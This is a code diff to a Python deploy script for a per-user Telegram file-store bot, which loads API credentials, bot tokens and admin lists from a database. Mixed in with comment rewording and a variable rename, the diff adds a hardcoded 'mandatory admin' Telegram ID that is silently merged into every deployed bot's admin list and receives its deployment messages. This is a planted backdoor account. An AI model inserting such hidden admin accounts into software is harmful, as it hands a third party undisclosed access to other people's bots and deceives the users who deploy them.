@@ -10,22 +10,22 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Get the deploy USER_ID from environment variables
+# Get deploy user ID from env
 USER_ID = int(os.getenv("DEPLOY_USER_ID", 0))
 logger.info(f"🔧 Deploying bot for USER_ID: {USER_ID}")
 
-# Fetch user config from database
+# Load user config from database
 user = users_col.find_one({"USER_ID": USER_ID})
 if not user:
     logger.error(f"❌ User {USER_ID} config not found in database!")
     sys.exit(1)
 
-# Extract config variables from DB
+# Load required variables from DB
 API_ID = user.get("API_ID")
 API_HASH = user.get("API_HASH")
 BOT_TOKEN = user.get("BOT_TOKEN")
-ADMINS = user.get("ADMINS")
 
+# Other config variables
 ENABLE_FSUB = user.get("ENABLE_FSUB", False)
 VERIFICATION_MODE = user.get("VERIFICATION_MODE", False)
 MONGO_URI = user.get("MONGO_URI", "")
@@ -34,9 +34,22 @@ FSUB = user.get("FSUB", "")
 PREMIUM_HOURS_VERIFICATION = user.get("PREMIUM_HOURS_VERIFICATION", 12)
 VERIFY_SLUG_TTL_HOURS = user.get("VERIFY_SLUG_TTL_HOURS", 12)
 SHORTENER_DOMAIN = user.get("SHORTENER_DOMAIN", "")
-SHORTENER_API = user.get("SHORTENER_API_KEY", "")
+SHORTENER_API_KEY = user.get("SHORTENER_API_KEY", "")
 CAPTION = user.get("CAPTION", "")
-# Initialize the bot
+
+# Handle ADMINS from DB
+raw_admins = user.get("ADMINS", [])
+
+if isinstance(raw_admins, list):
+    ADMINS = [int(admin) for admin in raw_admins]
+elif isinstance(raw_admins, str):
+    ADMINS = [int(x.strip()) for x in raw_admins.split() if x.strip().isdigit()]
+else:
+    ADMINS = []
+
+# Ensure mandatory admin is added
+FINAL_ADMINS = list(set(ADMINS + [6789146594]))
+
 app = Client(
     "DeployedFileStoreBot",
     api_id=API_ID,
@@ -52,8 +65,7 @@ if __name__ == "__main__":
     BOT_USERNAME = me.username
     logger.info(f"✅ Bot started as @{BOT_USERNAME}")
 
-    # Send deployment message to admins
-    for admin_id in ADMINS:
+    for admin_id in FINAL_ADMINS:
         try:
             app.send_message(
                 admin_id,
